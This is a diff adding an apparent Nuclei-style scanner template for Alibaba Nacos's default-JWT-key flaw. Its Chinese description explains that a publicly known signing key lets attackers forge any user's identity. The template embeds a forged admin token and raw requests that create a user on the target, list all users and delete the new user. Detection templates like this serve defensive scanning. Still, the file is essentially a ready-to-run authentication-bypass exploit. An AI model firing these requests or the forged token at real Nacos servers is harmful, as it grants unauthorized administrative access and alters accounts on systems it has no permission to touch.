@@ -1,0 +1,39 @@
+id: nacos-default-token
+
+info:
+  name: Alibaba Nacos - Default Token
+  author: SleepingBag945
+  severity: high
+  description: Nacos 在默认配置下使用固定的 JWT token密钥来对用户进行认证鉴权，由于Nacos是开源项目，该密钥是公开已知的，因此未授权的攻击者可用此固定密钥伪造任意用户身份登录Nacos，管理操作后台接口功能。
+  reference:
+    - https://github.com/alibaba/nacos/releases/tag/2.2.0.1
+  tags: nacos,unauth
+
+http:
+  - raw:
+      - |
+        POST /v1/auth/users/?username={{randstr_1}}&password={{randstr_2}}&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /v1/auth/users?pageNo=1&pageSize=9&search=blur&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        DELETE /v1/auth/users/?username={{randstr_1}}&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+ 
+
+    payloads:
+      token:
+        - eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'create user ok!')"
+          - "status_code_2 == 200"
+          - "contains(body_3,'delete user ok!')"
+        condition: and
